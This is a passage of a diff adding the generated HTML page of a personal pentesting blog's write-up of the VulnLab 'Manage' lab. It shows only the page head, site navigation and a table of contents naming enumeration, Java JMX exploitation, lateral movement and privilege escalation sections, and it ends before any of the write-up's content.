@@ -1,0 +1,1961 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A blog about pentesting, security, and technology.">
+      
+      
+      
+        <link rel="canonical" href="https://tomfieber.github.io/blog/2024/06/28/vulnlab-manage.html">
+      
+      
+        <link rel="prev" href="../22/vulnlab-breach.html">
+      
+      
+        <link rel="next" href="../29/vulnlab-baby.html">
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
+    
+    
+      
+        <title>VulnLab: Manage - My Personal Site</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.7e37652d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+        <script src="https://unpkg.com/iframe-worker/shim"></script>
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-HH4Y2D319L"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-HH4Y2D319L",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-HH4Y2D319L",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+    
+      
+        <meta  property="og:type"  content="website" >
+      
+        <meta  property="og:title"  content="VulnLab: Manage - My Personal Site" >
+      
+        <meta  property="og:description"  content="A blog about pentesting, security, and technology." >
+      
+        <meta  property="og:image"  content="https://tomfieber.github.io/assets/images/social/blog/posts/vulnlab-manage.png" >
+      
+        <meta  property="og:image:type"  content="image/png" >
+      
+        <meta  property="og:image:width"  content="1200" >
+      
+        <meta  property="og:image:height"  content="630" >
+      
+        <meta  property="og:url"  content="https://tomfieber.github.io/blog/2024/06/28/vulnlab-manage.html" >
+      
+        <meta  name="twitter:card"  content="summary_large_image" >
+      
+        <meta  name="twitter:title"  content="VulnLab: Manage - My Personal Site" >
+      
+        <meta  name="twitter:description"  content="A blog about pentesting, security, and technology." >
+      
+        <meta  name="twitter:image"  content="https://tomfieber.github.io/assets/images/social/blog/posts/vulnlab-manage.png" >
+      
+    
+    
+   <link href="../../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }
+    .gscrollbar-fixer { padding-right: 15px; }
+    .gdesc-inner { font-size: 0.75rem; }
+    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
+    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
+    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../../assets/javascripts/glightbox.min.js"></script></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#vulnlab-manage" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../index.html" title="My Personal Site" class="md-header__button md-logo" aria-label="My Personal Site" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Personal Site
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              VulnLab: Manage
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    tomfieber/tomfieber.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../index.html" class="md-tabs__link">
+        
+  
+  
+    
+  
+  About Me
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../index.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Blog
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../references/index.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  References
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../index.html" title="My Personal Site" class="md-nav__button md-logo" aria-label="My Personal Site" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Personal Site
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    tomfieber/tomfieber.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    About Me
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Blog
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Blog
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Archive
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Archive
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../archive/2024.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    2024
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Categories
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Categories
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../category/tryhackme.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    tryhackme
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../category/vulnlab.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    vulnlab
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../category/writeups.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    writeups
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    References
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            References
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Cheatsheets
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Cheatsheets
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_1" id="__nav_3_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Injection attacks
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Injection attacks
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_1" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/cheatsheets/injection-attacks/NoSQL/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    NoSQL
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            NoSQL
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/cheatsheets/injection-attacks/OS-command-injection/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    OS command injection
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            OS command injection
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/cheatsheets/injection-attacks/SQL-injection/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    SQL injection
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            SQL injection
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Methodologies
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Methodologies
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3_1" id="__nav_3_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web apps
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Web apps
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../references/methodologies/web-apps/owasp-wstg.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OWASP WSTG
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      Foothold
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-java-jmxrmi" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploiting Java JMXRMI
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lateral-movement" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lateral Movement
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
